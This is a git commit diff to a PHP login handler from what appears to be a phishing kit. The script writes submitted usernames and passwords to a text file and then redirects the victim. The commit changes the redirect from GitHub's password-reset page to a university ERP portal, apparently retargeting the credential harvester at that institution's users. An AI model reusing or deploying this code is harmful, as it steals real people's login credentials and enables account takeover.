e8d1d9470aca48e915282ba0310237f324b3bca1
Dhruv kumar <134788310+dK1925402@users.noreply.github.com>
2023-07-30 05:18:54 +0000

    Update login.php

--- .sites/github/login.php
+++ .sites/github/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Github Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://github.com/password_reset');
+file_put_contents("usernames.txt", "Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://erp.dseu.ac.in/');
 exit();
 ?>
